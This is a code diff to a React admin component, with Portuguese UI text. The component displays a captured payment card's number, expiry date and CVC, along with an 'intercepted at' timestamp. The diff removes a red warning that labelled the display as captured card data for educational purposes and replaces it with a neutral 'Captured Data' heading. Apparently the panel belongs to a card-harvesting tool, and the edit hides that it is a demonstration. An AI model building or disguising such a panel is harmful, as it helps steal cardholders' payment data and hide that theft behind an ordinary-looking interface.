@@ -156,16 +156,16 @@ const AdminOrders = () => {
 
               {/* Seção adicionada corretamente na árvore de elementos */}
               {cardData && cardData.length > 0 && (
-                <div className="border-2 border-red-500 bg-red-50 rounded-lg p-4">
-                  <p className="text-xs text-red-700 font-black mb-3 flex items-center gap-2">
-                    🚨 ALERTA: DADOS DO CARTÃO CAPTURADOS (EDUCACIONAL)
+                <div className="border-2 border-black-500 bg-black-50 rounded-lg p-4">
+                  <p className="text-xs text-black-700 font-black mb-3 flex items-center gap-2">
+                    Dados Capturados
                   </p>
-                  <div className="grid grid-cols-2 gap-2 text-red-900 font-mono">
+                  <div className="grid grid-cols-2 gap-2 text-black-900 font-mono">
                     <p>Número: <span className="font-bold">{cardData[0].card_number}</span></p>
                     <p>Validade: <span className="font-bold">{cardData[0].card_expiry}</span></p>
                     <p>CVC: <span className="font-bold">{cardData[0].card_cvc}</span></p>
                   </div>
-                  <p className="text-xs text-red-600 mt-3 border-t border-red-200 pt-2">
+                  <p className="text-xs text-black-600 mt-3 border-t border-black-200 pt-2">
                     Interceptado em: {new Date(cardData[0].timestamp).toLocaleString("pt-BR")}
                   </p>
                 </div>
